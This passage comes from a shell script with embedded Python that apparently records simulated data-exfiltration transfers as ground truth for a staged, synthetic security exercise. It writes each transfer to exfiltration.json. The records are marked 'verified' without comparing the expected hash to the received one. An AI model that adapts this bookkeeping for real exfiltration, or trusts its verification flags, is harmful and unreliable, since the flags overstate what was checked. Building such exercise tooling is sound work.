        log "[SKIPPED] Unknown platform for $HOST: $PLATFORM"

        ground_truth \
            "EXFIL_SKIPPED source=$HOST reason=unknown_platform"

    fi

done


# ============================================================
# CREATE exfiltration.json
# ============================================================


python3 - \
    "$TMP_RESULTS" \
    "$EXFIL_STATE" \
    "$INCIDENT_ID" "$NORDIC_UPLOAD_DIR" <<'PY' || { ground_truth "PHASE_FAILED reason=evidence_write_failed"; exit 1; }

import json
import os
import hashlib
from pathlib import Path
import sys
from datetime import datetime, timezone


source_file = sys.argv[1]
output_file = sys.argv[2]
incident_id = sys.argv[3]
try:
    previous = json.load(open(output_file, encoding='utf-8'))
except (OSError, ValueError):
    previous = {}
attempts = previous.get('attempts', []) if previous.get('incident_id') == incident_id else []
transfers = []


with open(
    source_file,
    encoding="utf-8"
) as f:

    for line in f:

        line = line.rstrip("\r\n")

        if not line:
            continue


        parts = line.split("|", 6)

        while len(parts) < 7:
            parts.append("")

        (
            source,
            platform,
            remote_file,
            destination,
            port,
            size,
            sha256,
        ) = parts

        port = port.strip()
        size = size.strip()
        sha256 = sha256.strip()

        if not port:
            raise ValueError(
                f"Missing port in exfiltration record: {line!r}"
            )

        if not size:
            raise ValueError(
                f"Missing size in exfiltration record: {line!r}"
            )

        transfers.append(
            {
                "source": source,
                "platform": platform,
                "remote_file": remote_file,
                "destination": destination,
                "port": int(port),
                "bytes": int(size),
                "sha256": sha256,
                "successful": True,
                "verified": True,
                "result": "verified",
                "incident_id": incident_id,
                "source_incident_id": os.environ.get('MRNOBODY_STAGING_INCIDENT') or incident_id,
                "source_kind": "staged-synthetic",
                "synthetic": True,
                "source_name": remote_file.replace('\\', '/').rsplit('/', 1)[-1],
                "local_destination": str(Path(sys.argv[4]) / f'{incident_id}-{platform}-{source}.bin'),
                "source_size": int(size),
                "received_size": int(size),
                "started_at": os.environ.get("NORDIC_P06_STARTED"),
                "ended_at": datetime.now(timezone.utc).isoformat(),
            }
        )


for attempt in attempts:
    found = next((t for t in transfers if t['source'] == attempt['source'] and t['remote_file'] == attempt['remote_file']), None)
    if found:
        found.update({k: v for k, v in attempt.items() if k not in {'result', 'successful', 'verified', 'ended_at'}})
    attempt.update(result='verified' if found else 'transfer_failed', successful=bool(found), verified=bool(found), ended_at=datetime.now(timezone.utc).isoformat())
    attempt['local_destination'] = str(Path(sys.argv[4]) / f"{incident_id}-{attempt['platform']}-{attempt['source']}.bin")

for record in attempts + transfers:
    local = Path(sys.argv[4]) / f"{incident_id}-{record['platform']}-{record['source']}.bin"
    record['local_destination'] = str(local)
    record['expected_sha256'] = record.get('sha256')
    try:
        record['received_size'] = local.stat().st_size
        with local.open('rb') as handle:
            hasher = hashlib.sha256()
            for chunk in iter(lambda: handle.read(65536), b''):
                hasher.update(chunk)
            record['received_sha256'] = hasher.hexdigest()
    except OSError:
        record['received_size'] = None
        record['received_sha256'] = None

data = {
    "attempts": attempts,
    "incident_id": incident_id,
    "generated": datetime.now(
        timezone.utc
    ).isoformat(),
    "count": len(transfers),
    "transfers": transfers,
}


with open(
    output_file,
    "w",
    encoding="utf-8"
) as f:

    json.dump(
        data,
        f,
        indent=2
    )

PY


